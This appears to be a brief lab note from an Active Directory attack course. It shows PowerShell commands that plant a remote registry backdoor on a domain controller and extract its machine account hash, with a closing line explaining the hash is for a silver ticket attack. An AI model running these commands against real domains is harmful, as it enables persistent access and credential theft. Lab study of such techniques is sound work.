
![[Pasted image 20250621172939.png]]


```
Add-RemoteRegBackdoor -ComputerName dcorp-dc-Trustee student1
-Verbose
```

![[Pasted image 20250621173051.png]]

![[Pasted image 20250621173110.png]]
```
. C:\AD\Tools\RACE.ps1
Get-RemoteMachineAccountHash -ComputerName dcorp-dc-Verbose
```

we are loading RCE tool as an normal user then extracting the machine account hash to perfoem an silver ticket attck

